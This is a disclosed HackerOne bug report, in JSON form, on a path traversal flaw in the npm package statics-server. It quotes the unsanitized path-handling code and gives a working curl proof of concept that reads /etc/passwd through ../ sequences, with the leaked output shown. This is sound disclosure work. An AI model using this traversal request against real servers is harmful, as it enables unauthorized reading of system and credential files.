{
  "id": 355456,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTU0NTY=",
  "url": "https://hackerone.com/reports/355456",
  "title": "[statics-server] Path Traversal due to lack of provided path sanitization",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-05-21T08:40:12.493Z",
  "submitted_at": "2018-05-21T08:40:12.493Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-04-03T20:05:24.566Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-03-04T20:05:19.951Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Team, \n\nI would like to report Path Traversal in ```statics-server``` module.\nIt allows to read content of any arbitrary file from the server.\n\n## Module\n\n**module name:** statics-server\n**version:** 0.0.9\n**npm page:** https://www.npmjs.com/package/statics-server\n\n### Module Description\n\n\nnpm install statics-server -g\n\nGo to the folder you want to statics-server\n\nRun the server statics-server\n\n\n### Module Stats\n\n~80-100 downloads/month\n\n## Vulnerability Description\n\nPath Traversal vulnerability in this module allows to go up in directory tree and read content of any file, including critical files like ```/etc/passwd```\n\nVulnerability exists, because ```staticPath``` is used directly, without any sanitization:\n\n```javascript\n    // node_modules/statics-server/index.js, line 13\n\n    const staticPath=path.resolve('.'+decodeURIComponent(req.url));\n    const indexPath=path.resolve(staticPath,'index.html');\n\n    (...)\n\n    // node_modules/statics-server/index.js, line 36 \n\n    if(fs.existsSync(staticPath)){\n        fs.createReadStream(staticPath).pipe(res);\n    }else {\n        res.end('404文件未找到');\n    }\n   \n```\n\n\n## Steps To Reproduce:\n\nInstall ```statics-server``` module:\n\n```\n$ npm install statics-server\n```\n\nRun ```statics-server```:\n\n```\n$ ./node_modules/statics-server/index.js \n服务器已经启动\n访问localhost:8080\n\n```\n\nRun following curl command to retrieve content of ```/etc/passwd``` (adjust amount of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../../../etc/passwd\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Date: Mon, 14 May 2018 14:53:15 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n(...)\nmongodb:x:126:65534::/var/lib/mongodb:/bin/false\n* Connection #0 to host 127.0.0.1 left intact\n```\n\n## Patch\n\n```staticPath``` should be sanitized against Path Traversal attacks \n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.11.1\n- npm v. 6.0.1\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker can exploit this vulnerability to gain an access to any file on the remote server.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-04-03T20:05:20.128Z",
  "allow_singular_disclosure_after": -153507543.8818606,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "foobar7"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 12358,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "statics-server",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
